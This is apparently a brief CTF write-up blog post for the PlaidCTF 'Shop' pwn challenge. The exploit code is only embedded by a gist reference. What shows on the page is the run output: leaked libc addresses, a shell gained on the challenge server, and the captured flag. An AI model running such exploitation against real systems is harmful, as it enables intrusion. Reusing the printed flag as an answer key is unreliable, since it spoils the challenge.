+++
title = "PlaidCTF: Shop (pwn)"
date = "2018-01-30T21:12:11+01:00"
tags = ["writeup", "ctf", "pwn"]
categories = ["writeup", "pwn"]
comments = true
highlight = true
draft = false
index = true
+++

Below you find the full exploit for PlaidCTF pwn200 task. Full write up will follow up.

<!--more-->

{{< gist segflow 8118ae58bea31f36d83671c212ec6079 >}}

And we run it:
```shell
[+] Opening connection to shop.chal.pwning.xxx on port 9916: Done
Stdout is at: 0x7f457d51d620
Stdin is at: 0x7f457d51c8e0
System is at: 0x7f457d19d390
[*] Switching to interactive mode
$ ls -la
total 24
drwxr-xr-x 2 root root  4096 May  5 01:33 .
drwxr-xr-x 5 root root  4096 May  5 01:33 ..
-rw-r----- 1 root shop    37 May  5 01:26 flag.txt
-rwxr-s--- 1 root shop 10520 May  5 01:26 shop
$ pwd
/home/shop
$ cat flag.txt
PCTF{I_w3nt_sh0pp1ng_w1th_D3_8ruj1n}
$ 
```

Flag: **PCTF{I_w3nt_sh0pp1ng_w1th_D3_8ruj1n}**